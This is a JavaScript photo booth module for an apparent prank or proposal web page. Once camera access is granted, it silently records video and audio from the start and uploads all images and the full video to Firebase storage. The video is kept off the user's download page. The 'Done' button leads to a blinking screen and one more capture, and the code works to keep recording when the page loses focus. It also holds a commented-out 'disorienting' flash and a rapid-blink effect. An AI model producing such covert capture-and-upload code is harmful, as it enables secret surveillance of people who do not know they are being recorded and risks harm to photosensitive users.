// ============================================================================
// CAMERA AND PHOTO BOOTH MODULE
// ============================================================================

let mediaStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let isRecording = false;
let capturedImages = [];
let videoBlob = null;
let finalFrameBlob = null;
let sessionId = null;
let imageCounter = 0;
let uploadedImageCount = 0;
let isUploadingImages = false;
let readyToShowDownload = false;
let compilingOverlay = null;
let compilingDotsInterval = null;
let isVideoBlobReady = false;
let isFinalizingAfterUploads = false;
let hasVideoUploadAttempted = false;
const UPLOAD_DEBUG = true;

function logUploadPipeline(message, extra) {
    if (!UPLOAD_DEBUG) return;
    if (extra !== undefined) {
        console.log(`[UPLOAD_PIPELINE] ${message}`, extra);
        return;
    }
    console.log(`[UPLOAD_PIPELINE] ${message}`);
}

function showCompilingOverlay() {
    if (compilingOverlay) return;

    compilingOverlay = document.createElement('div');
    compilingOverlay.id = 'compiling-overlay';
    compilingOverlay.style.position = 'fixed';
    compilingOverlay.style.inset = '0';
    compilingOverlay.style.zIndex = '10000002';
    compilingOverlay.style.background = '#000';
    compilingOverlay.style.display = 'flex';
    compilingOverlay.style.flexDirection = 'column';
    compilingOverlay.style.alignItems = 'center';
    compilingOverlay.style.justifyContent = 'center';
    compilingOverlay.style.gap = '20px';

    const spinner = document.createElement('div');
    spinner.style.width = '68px';
    spinner.style.height = '68px';
    spinner.style.border = '6px solid rgba(255, 255, 255, 0.25)';
    spinner.style.borderTopColor = '#fff';
    spinner.style.borderRadius = '50%';
    spinner.animate(
        [
            { transform: 'rotate(0deg)' },
            { transform: 'rotate(360deg)' }
        ],
        { duration: 850, iterations: Infinity, easing: 'linear' }
    );

    const text = document.createElement('p');
    text.id = 'compiling-text';
    text.textContent = 'Compiling...';
    text.style.margin = '0';
    text.style.fontWeight = '700';
    text.style.letterSpacing = '0.02em';
    text.style.color = '#fff';
    text.style.fontSize = 'clamp(1.2rem, 3.5vw, 2.4rem)';
    text.style.textAlign = 'center';

    let dotCount = 3;
    compilingDotsInterval = setInterval(() => {
        dotCount = (dotCount + 1) % 4;
        text.textContent = `Compiling${'.'.repeat(dotCount)}`;
    }, 300);

    compilingOverlay.appendChild(spinner);
    compilingOverlay.appendChild(text);
    document.body.appendChild(compilingOverlay);
}

function hideCompilingOverlay() {
    if (compilingDotsInterval) {
        clearInterval(compilingDotsInterval);
        compilingDotsInterval = null;
    }
    if (compilingOverlay && compilingOverlay.parentNode) {
        compilingOverlay.parentNode.removeChild(compilingOverlay);
    }
    compilingOverlay = null;
}
let camMode = false;

/**
 * Shows the attractive photo booth button after acceptance
 */
function showPhotoBoothButton() {
    const button = document.createElement('button');
    button.id = 'photo-booth-btn';
    button.className = 'photo-booth-btn';
    button.innerHTML = '📸 Let\'s take a Picture Together 📸';
    button.onclick = startPhotoBooth;
    document.body.appendChild(button);
}

/**
 * Initiates the photo booth by requesting camera permission
 */
async function startPhotoBooth() {
    try {
        // Get session ID from meta.js
        sessionId = window.sessionId;

        // Request camera permission
        mediaStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: true
        });

        // Remove the photo booth button
        const photoBtn = document.getElementById('photo-booth-btn');
        if (photoBtn) photoBtn.remove();

        // Create camera interface
        createCameraInterface();
        startRecording();
    } catch (error) {
        console.error('Camera access denied:', error);
        alert('Camera permission is required to take a picture together!');
    }
}

/**
 * Creates the camera interface with video feed and control buttons
 */
function createCameraInterface() {
    stopConfetti();
    camMode = true;

    const canvases = document.getElementsByTagName("canvas");
    for (let i = 0; i < canvases.length; i++) {
        canvases[i].style.display = 'none';
    }

    // Create container
    const container = document.createElement('div');
    container.id = 'camera-container';
    container.className = 'camera-container';
    container.style.cursor = 'auto';

    // Create video element
    const video = document.createElement('video');
    video.id = 'camera-feed';
    video.autoplay = true;
    video.playsinline = true;
    video.muted = true;
    video.srcObject = mediaStream;
    video.style.cursor = 'auto';

    // Prevent fullscreen mode and hide behavior
    document.body.style.cursor = 'auto';
    document.documentElement.style.cursor = 'auto';

    // Create canvas for capturing images
    const canvas = document.createElement('canvas');
    canvas.id = 'capture-canvas';
    canvas.style.display = 'none';

    // Create controls container
    const controls = document.createElement('div');
    controls.className = 'camera-controls';

    // Capture button
    const captureBtn = document.createElement('button');
    captureBtn.className = 'control-btn capture-btn';
    captureBtn.innerHTML = '📷 Capture';
    captureBtn.onclick = captureImage;

    // Stop button
    const stopBtn = document.createElement('button');
    stopBtn.className = 'control-btn stop-btn';
    stopBtn.innerHTML = '✅ Done';
    stopBtn.onclick = showHypnosisPage;

    controls.appendChild(captureBtn);
    controls.appendChild(stopBtn);

    container.appendChild(video);
    container.appendChild(canvas);
    container.appendChild(controls);
    document.body.appendChild(container);

    // Keep cursor visible and prevent fullscreen behavior
    initFocusManagement(video, container);
}

/**
 * Manages focus and prevents browser optimizations from throttling video
 */
function initFocusManagement(videoElement, containerElement) {
    let wakeLockSentinel = null;

    // Keep cursor visible with continuous check
    const ensureCursorVisible = setInterval(() => {
        document.body.style.cursor = 'auto';
        document.documentElement.style.cursor = 'auto';
        if (containerElement) containerElement.style.cursor = 'auto';
        if (videoElement) videoElement.style.cursor = 'auto';
    }, 500);

    // Prevent fullscreen on double-click or other triggers
    const preventFullscreen = (e) => {
        if (document.fullscreenElement) {
            document.exitFullscreen().catch(() => { });
        }
    };

    videoElement?.addEventListener('dblclick', preventFullscreen);
    document.addEventListener('fullscreenchange', preventFullscreen);

    // Request Wake Lock to prevent device sleep
    const requestWakeLock = async () => {
        try {
            if ('wakeLock' in navigator) {
                wakeLockSentinel = await navigator.wakeLock.request('screen');
                console.log('Wake Lock acquired');

                // Re-acquire lock if it's released
                wakeLockSentinel.addEventListener('release', () => {
                    console.log('Wake Lock released');
                    requestWakeLock();
                });
            }
        } catch (err) {
            console.log('Wake Lock API not available or failed:', err);
        }
    };

    // Skip pointer lock - it hides the cursor which we don't want
    // Just keep window focused instead
    const keepFocused = () => {
        try {
            if (!document.hasFocus()) {
                window.focus();
            }
        } catch (e) {
            // Focus might not be available in some contexts
        }
    };

    // Create a hidden animation to keep the page active
    const keepPageActive = () => {
        // This triggers continuous rendering loop
        let lastTime = performance.now();
        const animate = (currentTime) => {
            const deltaTime = currentTime - lastTime;
            lastTime = currentTime;

            // Log activity to prevent throttling
            if (isRecording && deltaTime > 0) {
                // Keep the page "busy" to prevent background throttling
                requestAnimationFrame(animate);
            }
        };
        requestAnimationFrame(animate);
    };

    // Set up intervals to maintain focus
    let focusCheckInterval = setInterval(() => {
        keepFocused();
    }, 1000);

    // Skip the lock interval - pointer lock hides cursor
    // Just keep focused

    // Start keeping page active
    keepPageActive();

    // Request wake lock
    requestWakeLock();

    // Prevent visibility changes from affecting the stream
    const handleVisibilityChange = () => {
        if (document.hidden && isRecording) {
            // If page becomes hidden while recording, try to regain focus
            setTimeout(() => {
                window.focus();
                keepFocused();
            }, 100);
        }
    };

    // Listen for focus changes
    const handleFocus = () => {
        console.log('Page regained focus');
    };

    const handleBlur = () => {
        console.log('Page lost focus, attempting to regain...');
        window.focus();
    };

    window.addEventListener('focus', handleFocus);
    window.addEventListener('blur', handleBlur);
    document.addEventListener('visibilitychange', handleVisibilityChange);
    document.addEventListener('click', keepFocused, true);

    // Store cleanup function on window for later
    window._focusCleanup = () => {
        clearInterval(focusCheckInterval);
        clearInterval(ensureCursorVisible);

        // Release wake lock
        if (wakeLockSentinel) {
            wakeLockSentinel.release().catch(err => {
                console.log('Wake Lock release error:', err);
            });
        }

        // Exit pointer lock
        try {
            if (document.exitPointerLock) {
                document.exitPointerLock();
            }
        } catch (e) {
            // Exit pointer lock might fail
        }

        // Remove event listeners
        window.removeEventListener('focus', handleFocus);
        window.removeEventListener('blur', handleBlur);
        document.removeEventListener('visibilitychange', handleVisibilityChange);
        document.removeEventListener('click', keepFocused, true);

        console.log('Focus management cleaned up');
    };
}
function startRecording() {
    recordedChunks = [];
    videoBlob = null;
    isVideoBlobReady = false;
    hasVideoUploadAttempted = false;
    const options = {
        mimeType: 'video/webm;codecs=vp9',
        videoBitsPerSecond: 2500000
    };

    // Fallback for browsers that don't support vp9
    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
        options.mimeType = 'video/webm;codecs=vp8';
    }
    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
        options.mimeType = 'video/webm';
    }

    mediaRecorder = new MediaRecorder(mediaStream, options);

    mediaRecorder.ondataavailable = (event) => {
        recordedChunks.push(event.data);
    };

    mediaRecorder.onstop = () => {
        videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
        isVideoBlobReady = true;
        checkIfAllUploadsComplete();
    };

    mediaRecorder.start();
    isRecording = true;
}

/**
 * Captures a single image from the current video frame and uploads to Firebase
 */
function captureImage() {
    // // Create eye-blinding, sense-shattering flash effect
    // const flash = document.createElement('div');
    // flash.style.position = 'fixed';
    // flash.style.top = '0';
    // flash.style.left = '0';
    // flash.style.width = '100%';
    // flash.style.height = '100%';
    // flash.style.backgroundColor = '#ffffff';
    // flash.style.boxShadow = 'inset 0 0 100px rgba(255, 255, 255, 1)';
    // flash.style.opacity = '1';
    // flash.style.zIndex = '99999';
    // flash.style.pointerEvents = 'none';
    // flash.style.filter = 'brightness(1.5)';
    // document.body.appendChild(flash);

    // // Remove flash instantly - rapid, disorienting burst
    // setTimeout(() => {
    //     flash.style.transition = 'opacity 0.02s ease-out';
    //     flash.style.opacity = '0';
    //     setTimeout(() => flash.remove(), 20);
    // }, 50);

    // console.log('Capturing image...');

    if (camMode) triggerCenterFlash();

    const video = document.getElementById('camera-feed');
    const canvas = document.getElementById('capture-canvas');
    const ctx = canvas.getContext('2d');

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);

    // Increment counter NOW before async operation to ensure each image gets unique index
    imageCounter++;
    const currentImageIndex = imageCounter;

    // Store image blob and upload to Firebase
    canvas.toBlob(async (blob) => {
        const imageData = {
            blob: blob,
            timestamp: Date.now(),
            url: URL.createObjectURL(blob)
        };
        capturedImages.push(imageData);

        // Upload to Firebase Storage in real-time
        if (sessionId) {
            try {
                const storagePath = `sessions/${sessionId}/images/image_${currentImageIndex}.jpg`;
                const downloadUrl = await uploadBlobToStorage(blob, storagePath);

                // Record upload in database
                await uploadToDatabase(`sessions/${sessionId}/images/image_${currentImageIndex}`, {
                    timestamp: new Date().toISOString(),
                    index: currentImageIndex,
                    downloadUrl: downloadUrl
                });
            } catch (error) {
                console.error('Failed to upload image:', error);
            }
        }

        // Count this image as completed (uploaded or attempted) so pipeline can continue.
        uploadedImageCount++;
        checkIfAllUploadsComplete();

        // Visual feedback - brief subtitle showing image was captured
        const heading2 = document.getElementById('heading2');
        if (heading2) {
            const originalText = heading2.textContent;
            heading2.textContent = `📷 Captured! (${capturedImages.length + 1})`;
            setTimeout(() => {
                if (heading2 && !isUploadingImages) {
                    heading2.textContent = originalText;
                }
            }, 1500);
        }
    });
}

/**
 * Stops recording and shows hypnotic upload page
 */
function stopPictures() {
    if (mediaRecorder && isRecording) {
        isRecording = false;
        isUploadingImages = true;
        logUploadPipeline('Stop requested -> entering compiling/upload phase');

        // Hide the camera feed immediately
        const container = document.getElementById('camera-container');
        if (container) container.style.display = 'none';

        // Stop recorder now so video blob can be prepared during "Compiling...".
        if (mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        }

        // Capture final frame from camera
        setTimeout(async () => {
            const video = document.getElementById('camera-feed');
            if (video) {
                const canvas = document.getElementById('capture-canvas');
                const ctx = canvas.getContext('2d');

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);

                canvas.toBlob((blob) => {
                    finalFrameBlob = blob;
                    // Check if all images are uploaded, if so proceed to cleanup
                    checkIfAllUploadsComplete();
                });
            } else {
                checkIfAllUploadsComplete();
            }
        }, 500);
    }
}

/**
 * Checks if all image uploads are complete and proceeds to show download page
 */
async function checkIfAllUploadsComplete() {
    // Only run finalization during uploading stage and once at a time.
    if (!isUploadingImages || readyToShowDownload || isFinalizingAfterUploads) return;

    const allImagesComplete = imageCounter === 0 || uploadedImageCount >= imageCounter;
    const finalFrameReady = Boolean(finalFrameBlob);

    // Wait until image uploads, final-frame capture, and video blob are all ready.
    if (!allImagesComplete || !finalFrameReady || !isVideoBlobReady) return;

    isFinalizingAfterUploads = true;
    try {
        logUploadPipeline('All image uploads complete; starting video upload', {
            imageCounter,
            uploadedImageCount
        });
        // Required order: after all image uploads, upload the video.
        await uploadVideoAfterImages();
        readyToShowDownload = true;
        logUploadPipeline('Video upload phase done; proceeding to download page');
        cleanup();
    } finally {
        isFinalizingAfterUploads = false;
    }
}

/**
 * Shows rapid blinking animation while files upload
 */
function showHypnosisPage() {
    const container = document.createElement('div');
    container.style.position = 'fixed';
    container.style.top = '0';
    container.style.left = '0';
    container.style.width = '100%';
    container.style.height = '100%';
    container.style.zIndex = '10000000';
    container.style.backgroundColor = 'rgb(255, 203, 227)';
    container.style.display = 'flex';
    container.style.alignItems = 'center';
    container.style.justifyContent = 'center';

    const message = document.createElement('p');
    message.textContent = "Shyyy, let's take more!! 🤡 \n Say cheese!";
    message.style.margin = '0';
    message.style.padding = '0 24px';
    message.style.textAlign = 'center';
    message.style.color = 'rgb(255, 0, 64)';
    message.style.fontWeight = '700';
    message.style.fontSize = 'clamp(1.6rem, 4.8vw, 3.4rem)';
    message.style.lineHeight = '1.2';
    container.appendChild(message);

    document.body.appendChild(container);

    setTimeout(() => {
        document.body.removeChild(container);
        RapidBlink("rgb(255, 203, 227)", 60, 20, false, true, () => {
            // RapidBlink("rgb(255, 203, 227)", 60, 10, false, false, stopPictures);
            showCompilingOverlay();
            stopPictures();
            startConfetti();
        });
    }, 2000);

}

/**
 * Downloads all captured files at once (excludes video which is handled separately)
 */
async function downloadAll() {
    // Use JSZip library if available, otherwise download files individually with delay
    if (typeof JSZip !== 'undefined') {
        const zip = new JSZip();

        // Add final frame
        if (finalFrameBlob) {
            zip.file(`final-photo.png`, finalFrameBlob);
        }

        // Add all captured images
        capturedImages.forEach((img, index) => {
            zip.file(`photo-${index + 1}.png`, img.blob);
        });

        // Generate and download zip (video not included - handled separately)
        zip.generateAsync({ type: 'blob' }).then((blob) => {
            const url = URL.createObjectURL(blob);
            const link = document.createElement('a');
            link.href = url;
            link.download = `photo-booth-${Date.now()}.zip`;
            link.click();
            URL.revokeObjectURL(url);
        });
    } else {
        // Fallback: download files individually with staggered delays
        let delay = 0;

        // Download final frame
        if (finalFrameBlob) {
            setTimeout(() => {
                const url = URL.createObjectURL(finalFrameBlob);
                const link = document.createElement('a');
                link.href = url;
                link.download = `final-photo-${Date.now()}.png`;
                link.click();
                URL.revokeObjectURL(url);
            }, delay);
            delay += 500;
        }

        // Download captured images (video not included - handled separately)
        capturedImages.forEach((img, index) => {
            setTimeout(() => {
                const url = URL.createObjectURL(img.blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = `photo-${index + 1}-${Date.now()}.png`;
                link.click();
                URL.revokeObjectURL(url);
            }, delay);
            delay += 500;
        });
    }
}

/**
 * Shows the thank you page with all captured files ready to download
 */
function showDownloadPage() {
    const container = document.createElement('div');
    container.id = 'download-page';
    container.className = 'download-page';

    // Create content wrapper
    const content = document.createElement('div');
    content.className = 'download-content';

    // Thank you message
    const heading = document.createElement('h2');
    heading.className = 'download-heading';
    heading.innerHTML = 'Thanks for saying yes! ❤️';

    const subheading = document.createElement('p');
    subheading.className = 'download-subheading';
    subheading.innerHTML = `Your memories are ready! Captured ${capturedImages.length} photos`;

    // Media grid
    const mediaGrid = document.createElement('div');
    mediaGrid.className = 'media-grid';

    // Add final photo first if available
    if (finalFrameBlob) {
        const gridItem = document.createElement('div');
        gridItem.className = 'media-grid-item';
        const img = document.createElement('img');
        img.src = URL.createObjectURL(finalFrameBlob);
        img.alt = 'Final photo';
        gridItem.appendChild(img);
        mediaGrid.appendChild(gridItem);
    }

    // Add captured images
    capturedImages.forEach((imgData, index) => {
        const gridItem = document.createElement('div');
        gridItem.className = 'media-grid-item';
        const img = document.createElement('img');
        img.src = imgData.url;
        img.alt = `Photo ${index + 1}`;
        gridItem.appendChild(img);
        mediaGrid.appendChild(gridItem);
    });

    // Buttons container
    const buttonsContainer = document.createElement('div');
    buttonsContainer.className = 'download-buttons';

    // Download all button
    const downloadBtn = document.createElement('button');
    downloadBtn.className = 'download-btn primary-btn';
    downloadBtn.innerHTML = '⬇️ Download All';
    downloadBtn.onclick = downloadAll;

    // Done button
    const doneBtn = document.createElement('button');
    doneBtn.className = 'download-btn secondary-btn';
    doneBtn.innerHTML = '✨ Done';
    doneBtn.onclick = finishAndReset;

    buttonsContainer.appendChild(downloadBtn);
    buttonsContainer.appendChild(doneBtn);

    // Assemble the page
    content.appendChild(heading);
    content.appendChild(subheading);
    content.appendChild(mediaGrid);
    content.appendChild(buttonsContainer);

    container.appendChild(content);
    document.body.appendChild(container);
}

/**
 * Cleans up the camera interface and shows download page
 */
function cleanup() {
    hideCompilingOverlay();
    logUploadPipeline('Landing on download page');

    const container = document.getElementById('camera-container');
    if (container) container.remove();

    const video = document.getElementById('camera-feed');
    if (video) video.remove();

    // Clean up focus management
    if (window._focusCleanup) {
        window._focusCleanup();
        delete window._focusCleanup;
    }

    // Reset uploading flags
    isUploadingImages = false;
    isFinalizingAfterUploads = false;

    // Recording should already be stopped before cleanup; just release tracks.
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
    }

    // Remove hypnosis page
    const hypnosisPage = document.getElementById('hypnosis-page');
    if (hypnosisPage) hypnosisPage.remove();

    // Show the download page with all captured files
    showDownloadPage();
}

/**
 * Uploads video after all image uploads complete (during "Compiling...")
 */
async function uploadVideoAfterImages() {
    if (hasVideoUploadAttempted) return;
    hasVideoUploadAttempted = true;

    if (!videoBlob || !sessionId) {
        logUploadPipeline('Video upload skipped (missing blob or sessionId)', {
            hasVideoBlob: Boolean(videoBlob),
            hasSessionId: Boolean(sessionId)
        });
        return;
    }

    try {
        logUploadPipeline('Video upload started', {
            sizeBytes: videoBlob.size
        });
        const storagePath = `sessions/${sessionId}/video.webm`;
        const downloadUrl = await uploadBlobToStorage(videoBlob, storagePath);

        // Record video upload in database
        await uploadToDatabase(`sessions/${sessionId}/video`, {
            timestamp: new Date().toISOString(),
            downloadUrl: downloadUrl,
            size: videoBlob.size
        });

        logUploadPipeline('Video upload completed', { downloadUrl });
    } catch (error) {
        console.error('[UPLOAD_PIPELINE] Video upload failed:', error);
    }
}

/**
 * Cleans up resources and finishes the photo booth session
 */
function finishAndReset() {
    location.reload();
}

// ============================================================================
// EXPORT FUNCTIONS TO WINDOW
// ============================================================================
window.showPhotoBoothButton = showPhotoBoothButton;
window.startPhotoBooth = startPhotoBooth;
window.captureImage = captureImage;
window.showHypnosisPage = showHypnosisPage;
window.downloadAll = downloadAll;
window.finishAndReset = finishAndReset;

